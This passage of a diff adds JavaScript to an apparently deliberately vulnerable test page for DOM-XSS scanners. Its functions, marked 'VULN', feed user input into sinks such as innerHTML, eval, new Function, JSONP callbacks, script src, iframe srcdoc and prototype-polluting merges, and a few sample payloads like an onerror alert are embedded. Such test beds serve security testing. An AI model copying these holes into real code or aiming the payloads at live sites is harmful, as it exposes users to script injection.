+  window.postMessage('document.getElementById("v20_out").style.border="2px solid #f38ba8";document.getElementById("v20_out").textContent="postMessage self-test executed (any origin allowed)";', '*');
+}
+
+function vuln21_test() {
+  // Simulate cross-origin with bypassing "trusted" check (e.g. trusted.evil.com)
+  // We fake it by dispatching via MessageEvent, but browsers don't allow spoofing origin.
+  // For scanner testing, we directly invoke the sink:
+  document.getElementById('v21_out').innerHTML = '<b style="color:#f9e2af">postMessage -> innerHTML gadget active. Bypass origin check using origin like https://trusted.evil.example</b><br><img src=x onerror=alert(21)>';
+}
+
+function vuln22() {
+  var cb = document.getElementById('v22_input').value || getParam('cb');
+  // VULN: JSONP callback reflected into script src and executed
+  // Demonstration without server: build a script element whose only content is the callback name (which will throw but eval-like patterns exist in real apps)
+  // Here we use the inline-script JSONP pattern some gadgets use:
+  var s = document.createElement('script');
+  // Simulated JSONP endpoint inline:
+  s.textContent = '/**/ typeof ' + cb + ' === \'function\' && ' + cb + '({"ok":true});';
+  // Many real-world sinks do: s.src = '/api?cb=' + encodeURIComponent(cb);
+  // We also append a direct script.src using the callback to demonstrate:
+  document.body.appendChild(s);
+  document.getElementById('v22_out').textContent = 'JSONP callback injected: ' + cb;
+}
+
+function vuln23_html() {
+  var val = document.getElementById('v23_input').value;
+  // VULN: jQuery-style .html()
+  document.getElementById('v23_out').innerHTML = val;
+}
+function vuln23_eval() {
+  var val = prompt('Enter JS to run via $.globalEval:');
+  // VULN: jQuery $.globalEval equivalent
+  (function(){ eval(val); })();
+}
+
+function vuln24() {
+  var val = document.getElementById('v24_input').value;
+  // VULN: Simulated old-jQuery $(html) behavior: if starts with '<', parse HTML
+  if (val.charAt(0) === '<') {
+    var t = document.createElement('div');
+    t.innerHTML = val;
+    var out = document.getElementById('v24_out');
+    out.innerHTML = '';
+    while (t.firstChild) out.appendChild(t.firstChild);
+    // Also eval script tags (old jQuery behavior)
+    var scripts = out.querySelectorAll('script');
+    scripts.forEach(function(sc){
+      var n = document.createElement('script');
+      if (sc.src) n.src = sc.src; else n.textContent = sc.textContent;
+      document.body.appendChild(n);
+    });
+  } else {
+    // fallback: querySelector
+    var el = document.querySelector(val);
+    document.getElementById('v24_out').textContent = el ? 'Found: ' + el.tagName : 'Not found';
+  }
+}
+
+function vuln25() {
+  var val = document.getElementById('v25_input').value || getParam('lib');
+  var s = document.createElement('script');
+  // VULN: dynamic script src
+  s.src = val;
+  s.onload = function(){ alert('Library loaded: ' + val); };
+  s.onerror = function(){ alert('Library failed to load (CSP/network): ' + val); };
+  document.head.appendChild(s);
+}
+
+function vuln26() {
+  var val = document.getElementById('v26_input').value;
+  var range = document.createRange();
+  range.selectNode(document.getElementById('v26_out'));
+  // VULN: createContextualFragment
+  var frag = range.createContextualFragment(val);
+  document.getElementById('v26_out').appendChild(frag);
+}
+
+function vuln27() {
+  var val = document.getElementById('v27_input').value;
+  var out = document.getElementById('v27_out');
+  var x = new XMLHttpRequest();
+  x.open('GET', val, true);
+  x.onload = function() {
+    if (val.startsWith('data:text/html')) {
+      // VULN: DOMParser parse then innerHTML
+      var dp = new DOMParser();
+      var doc = dp.parseFromString(x.responseText, 'text/html');
+      out.innerHTML = doc.body.innerHTML;
+    } else {
+      out.textContent = 'Fetched ' + val + ' (' + x.status + '). (CORS may block cross-origin.)';
+    }
+  };
+  x.onerror = function(){ out.textContent = 'Fetch failed for: ' + val; };
+  try { x.send(); } catch(e){ out.textContent = 'Error: ' + e.message; }
+}
+
+function vuln28() {
+  var val = document.getElementById('v28_input').value;
+  // Push state with attacker message
+  history.pushState({ message: val }, '', '#state=' + encodeURIComponent(val).slice(0,20));
+  // VULN: popstate handler renders state.message as HTML
+  window.dispatchEvent(new PopStateEvent('popstate', { state: { message: val } }));
+}
+window.addEventListener('popstate', function(e) {
+  if (e.state && e.state.message) {
+    document.getElementById('v28_out').innerHTML = e.state.message; // VULN
+  }
+});
+
+function vuln29() {
+  // VULN: window.name -> innerHTML
+  document.getElementById('v29_out').innerHTML = window.name || '(window.name is empty)';
+}
+
+function vuln30() {
+  // VULN: referrer -> innerHTML
+  document.getElementById('v30_out').innerHTML = 'Referrer: ' + (document.referrer || '(none)') +
+    '<br><br><span style="color:#a6adc8">To test, navigate here from a page whose URL contains HTML payloads in the query string.</span>';
+}
+
+function vuln31() {
+  var val = document.getElementById('v31_input').value;
+  // VULN: CSS url() injection via string concatenation
+  document.getElementById('v31_target').style.backgroundImage = 'url(' + val + ')';
+}
+
+function vuln32() {
+  var val = document.getElementById('v32_input').value;
+  var out = document.getElementById('v32_out');
+  out.innerHTML = '';
+  var a = document.createElement('a');
+  a.textContent = 'Click me: ' + val;
+  // VULN: href assignment allows javascript:
+  a.href = val;
+  a.target = '_blank';
+  a.style.color = '#f38ba8';
+  out.appendChild(a);
+}
+
+function vuln33() {
+  var val = document.getElementById('v33_input').value;
+  // VULN: form.action manipulation
+  document.getElementById('v33_form').action = val;
+  alert('Form action set to: ' + val);
+}
+
+function vuln34() {
+  var val = document.getElementById('v34_input').value;
+  var out = document.getElementById('v34_out');
+  var btn = document.createElement('button');
+  btn.textContent = 'Click me (dynamic inline handler)';
+  // VULN: inline handler built via string concatenation -> Function
+  btn.onclick = new Function('event', 'var user = "' + val.replace(/"/g,'&quot;') + '"; alert("Hello, " + user);');
+  out.innerHTML = '';
+  out.appendChild(btn);
+}
+
+function vuln35() {
+  // VULN: uses window.globalConfig without defining it — DOM clobberable
+  var cfg = window.globalConfig || { url: '/safe' };
+  document.getElementById('v35_out').textContent = 'Config url = ' + cfg.url;
+  // Simulate navigation using cfg.url
+  setTimeout(function(){
+    if (cfg.url && cfg.url.indexOf('javascript:') === 0) {
+      // In a real app this would be location.href = cfg.url; we alert instead to avoid auto-nav
+      document.getElementById('v35_out').innerHTML += '<br><span style="color:#f38ba8">Would navigate to: <b>' + cfg.url + '</b></span>';
+    }
+  }, 100);
+}
+
+function vuln36() {
+  // Vulnerable deep merge (prototype pollution gadget)
+  function merge(target, source) {
+    for (var key in source) {
+      if (source.hasOwnProperty(key)) {
+        if (typeof source[key] === 'object' && source[key] !== null && typeof target[key] === 'object') {
+          merge(target[key], source[key]);
+        } else {
+          target[key] = source[key];
+        }
+      }
+    }
+  }
+  var val = document.getElementById('v36_input').value;
+  try {
+    var opts = JSON.parse(val);
+    var userOpts = {};
+    merge(userOpts, opts);
+    // Pollution test
+    var polluted = ({}).polluted;
+    document.getElementById('v36_out').textContent = 'Merged. Object.prototype.polluted = ' + polluted;
+    // Downstream XSS gadget using a "default" that can be polluted
+    var defaults = { template: '<b>hello</b>' };
+    // If someone polluted defaults.template, it gets injected here:
+    var sink = document.getElementById('v36_out');
+    sink.innerHTML += '<br><div>' + defaults.template + '</div>'; // secondary XSS via polluted property
+  } catch(e) {
+    document.getElementById('v36_out').textContent = 'Error: ' + e.message;
+  }
+}
+
+function vuln37() {
+  var val = document.getElementById('v37_input').value;
+  try {
+    // VULN: WebSocket from user input
+    var ws = new WebSocket(val);
+    var out = document.getElementById('v37_out');
+    ws.onopen = function(){ out.textContent = 'WS connected to ' + val; ws.close(); };
+    ws.onerror = function(){ out.textContent = 'WS error connecting to ' + val; };
+  } catch(e) {
+    document.getElementById('v37_out').textContent = 'Error: ' + e.message;
+  }
+}
+
+function vuln39() {
+  var val = document.getElementById('v39_input').value;
+  try {
+    var blob = new Blob([val], { type: 'application/javascript' });
+    var url = URL.createObjectURL(blob);
+    // VULN: Worker from blob: URL built from user input
+    var w = new Worker(url);
+    w.onmessage = function(e){ document.getElementById('v39_out').textContent = 'Worker msg: ' + e.data; };
+    w.postMessage('start');
+  } catch(e) {
+    document.getElementById('v39_out').textContent = 'Error: ' + e.message;
+  }
+}
+
+function vuln40() {
+  var val = document.getElementById('v40_input').value;
+  var host = document.getElementById('v40_host');
+  host.innerHTML = '';
+  var shadow = host.attachShadow({ mode: 'open' });
+  // VULN: shadowRoot.innerHTML sink
+  shadow.innerHTML = '<style>:host{display:block;background:#11111b;padding:10px;border-radius:4px;}</style>' + val;
+}
+
+function vuln41() {
+  var val = document.getElementById('v41_input').value;
+  var out = document.getElementById('v41_out');
+  out.innerHTML = '';
+  var fr = document.createElement('iframe');
+  fr.style.width = '100%';
+  fr.style.height = '120px';
+  // VULN: srcdoc sink
+  fr.srcdoc = val;
+  out.appendChild(fr);
+}
+
+function vuln42() {
+  var val = document.getElementById('v42_input').value;
+  var tpl = document.createElement('template');
+  // VULN: template innerHTML
+  tpl.innerHTML = '<div>' + val + '</div>';
+  var out = document.getElementById('v42_out');
+  out.innerHTML = '';
+  out.appendChild(tpl.content.cloneNode(true));
+}
+
+function vuln44() {
+  var val = document.getElementById('v44_input').value || getParam('expr2');
+  try {
+    // VULN: expression evaluator using new Function
+    var f = new Function('return (' + val + ')');
+    var r = f();
+    document.getElementById('v44_out').textContent = 'Evaluated to: ' + r;
+  } catch(e) {
+    // Even if parsing fails, the Function constructor itself can cause side effects in many setups; just show error
+    document.getElementById('v44_out').textContent = 'Error: ' + e.message;
+  }
+}
+
+function safe1() {
+  var val = document.getElementById('v45_input').value;
+  // SAFE: uses textContent
+  document.getElementById('v45_out').textContent = val;
+}
+</script>
+
+</body>
+</html>
